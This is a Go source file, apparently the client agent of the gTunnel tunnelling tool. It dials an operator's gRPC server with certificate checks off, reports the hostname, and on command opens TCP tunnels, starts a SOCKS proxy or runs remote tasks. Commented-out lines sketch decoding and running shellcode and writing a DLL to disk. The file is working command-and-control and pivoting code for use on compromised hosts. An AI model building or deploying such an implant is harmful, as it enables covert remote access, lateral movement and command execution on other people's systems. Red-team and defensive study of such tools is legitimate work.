package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"os"

	pb "github.com/hotnops/gtunnel/gTunnel"

	"github.com/hotnops/gtunnel/common"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

var ID = "hostname"
var serverAddress = ""
var serverPort = "" // This needs to be a string to be used with -X

var httpProxyServer = ""
var httpsProxyServer = ""

type gClient struct {
	endpoint    *common.Endpoint
	ctrlStream  pb.GTunnel_CreateEndpointControlStreamClient
	grpcClient  pb.GTunnelClient
	killClient  chan bool
	gCtx        context.Context
	socksServer *common.SocksServer
	executor    *Executor
}

type ClientStreamHandler struct {
	client     pb.GTunnelClient
	gCtx       context.Context
	ctrlStream common.TunnelControlStream
}

// GetByteStream is responsible for returning a bi-directional gRPC
// stream that will be used for relaying TCP data.
func (c *ClientStreamHandler) GetByteStream(ctrlMessage *pb.TunnelControlMessage) common.ByteStream {
	stream, err := c.client.CreateConnectionStream(c.gCtx)
	if err != nil {
		return nil
	}

	// Once byte stream is open, send an initial message
	// with all the appropriate IDs
	bytesMessage := new(pb.BytesMessage)
	bytesMessage.EndpointID = ctrlMessage.EndpointID
	bytesMessage.TunnelID = ctrlMessage.TunnelID
	bytesMessage.ConnectionID = ctrlMessage.ConnectionID

	stream.Send(bytesMessage)

	// Lastly, forward the control message to the
	// server to indicate we have acknowledged the connection
	ctrlMessage.Operation = common.TunnelCtrlAck
	c.ctrlStream.Send(ctrlMessage)

	return stream
}

// Acknowledge is called to indicate that the TCP connection has been
// established on the remote side of the tunnel.
func (c *ClientStreamHandler) Acknowledge(ctrlMessage *pb.TunnelControlMessage) common.ByteStream {
	return c.GetByteStream(ctrlMessage)
}

// CloseStream does nothing.
func (c *ClientStreamHandler) CloseStream(connId int32) {
	return
}

// receiveClientControlMessages is responsible for reading
// all control messages and dealing with them appropriately.
func (c *gClient) receiveClientControlMessages() {
	ctrlMessageChan := make(chan *pb.EndpointControlMessage)

	go func(c pb.GTunnel_CreateEndpointControlStreamClient, cc *gClient) {
		for {
			message, err := c.Recv()
			if err == io.EOF {
				break
			} else if err != nil {
				fmt.Println(err)
				<-cc.killClient
				break
			}
			ctrlMessageChan <- message
		}
	}(c.ctrlStream, c)

	for {
		select {
		case message := <-ctrlMessageChan:
			operation := message.Operation
			if operation == common.EndpointCtrlAddTunnel {

				newTunnel := common.NewTunnel(message.TunnelID, message.LocalIp, message.LocalPort, message.RemoteIP, message.RemotePort)
				f := new(ClientStreamHandler)
				f.client = c.grpcClient
				f.gCtx = c.gCtx

				if message.LocalPort != 0 {
					newTunnel.AddListener(int32(message.LocalPort), c.endpoint.Id)
				}

				tStream, _ := c.grpcClient.CreateTunnelControlStream(c.gCtx)

				// Once we have the control stream, set it in our client handler
				f.ctrlStream = tStream
				newTunnel.ConnectionHandler = f
				newTunnel.SetControlStream(tStream)

				// Send a message through the new stream
				// to let the server know the ID specifics
				tMsg := new(pb.TunnelControlMessage)
				tMsg.EndpointID = message.EndpointID
				tMsg.TunnelID = message.TunnelID
				tStream.Send(tMsg)

				c.endpoint.AddTunnel(message.TunnelID, newTunnel)
				newTunnel.Start()

			} else if operation == common.EndpointCtrlSocksProxy {
				message.Operation = common.EndpointCtrlSocksProxyAck
				message.ErrorStatus = 0
				if c.socksServer != nil {
					message.ErrorStatus = 1
				}
				log.Printf("Starting socks server")
				c.socksServer = common.NewSocksServer(message.RemotePort)
				if !c.socksServer.Start() {
					message.ErrorStatus = 2
				}
				//c.ctrlStream.SendMsg(message)
			} else if operation == common.EndpointCtrlSocksKill {
				if c.socksServer != nil {
					c.socksServer.Stop()
					c.socksServer = nil
				}
			} else if operation == common.EndpointCtrlCMD {
				stream, _ := c.grpcClient.CreateEndpointTaskStream(c.gCtx)
				c.endpoint.NewTaskHandler(stream, true, c.endpoint.Id)
				c.endpoint.TaskHandler.SetExecutor(c.executor)

				taskMsg := new(pb.EndpointTaskMessage)
				taskMsg.EndpointID = c.endpoint.Id
				stream.Send(taskMsg)

				c.endpoint.TaskHandler.Start()
				// c.taskHandler = common.NewTaskHandler(stream, true)
				// c.taskHandler.SetStream()
				// c.taskStream = stream

				// sc, _ := hex.DecodeString(message.Cmd)
				// go Run(sc)

				// if message.Sc != nil {
				// 	h := sha1.New()
				// 	h.Write(message.Sc)
				// 	bs := h.Sum(nil)
				// 	fmt.Printf("%x\n", bs)
				// 	_ = ioutil.WriteFile("dat1.dll", message.Sc, 0644)
				// }
				// go func(str pb.GTunnel_CreateEndpointTaskStreamClient) {
				// 	cmdResult, err := ExecuteCmd(message.Cmd)
				// 	if err == nil {
				// 		taskMsg.CmdResult = []byte(cmdResult)
				// 		str.Send(taskMsg)
				// 	}
				// }(stream)
			} else if operation == common.EndpointCtrlDisconnect {
				close(c.killClient)
			}

		case <-c.killClient:
			break
			// os.Exit(0)
		}
	}
}

func connect() {
	var err error
	var cancel context.CancelFunc
	ID, err = os.Hostname()
	ID += "-" + common.GenerateString(5)

	config := &tls.Config{
		InsecureSkipVerify: true,
	}

	if len(httpProxyServer) > 0 {
		os.Setenv("HTTP_PROXY", httpProxyServer)
	}

	if len(httpsProxyServer) > 0 {
		os.Setenv("HTTPS_PROXY", httpsProxyServer)
	}

	var opts []grpc.DialOption
	opts = append(opts, grpc.WithTransportCredentials(credentials.NewTLS(config)))

	gClient := new(gClient)
	gClient.endpoint = common.NewEndpoint(ID)
	gClient.killClient = make(chan bool)
	gClient.socksServer = nil

	serverAddr := fmt.Sprintf("%s:%s", serverAddress, serverPort)

	conn, err := grpc.Dial(serverAddr, opts...)
	if err != nil {
		return
	}
	defer conn.Close()

	gClient.executor = &Executor{}

	gClient.grpcClient = pb.NewGTunnelClient(conn)
	gClient.gCtx, cancel = context.WithCancel(context.Background())
	defer cancel()

	conMsg := new(pb.EndpointControlMessage)
	conMsg.EndpointID = gClient.endpoint.Id
	conMsg.Cmd = "sysinfo"
	conMsg.CmdResult = []byte("whoami")
	gClient.ctrlStream, err = gClient.grpcClient.CreateEndpointControlStream(gClient.gCtx, conMsg)

	if err != nil {
		return
	}

	go gClient.receiveClientControlMessages()
	<-gClient.killClient

}

// Where the magic happens
func main() {
	connect()
}
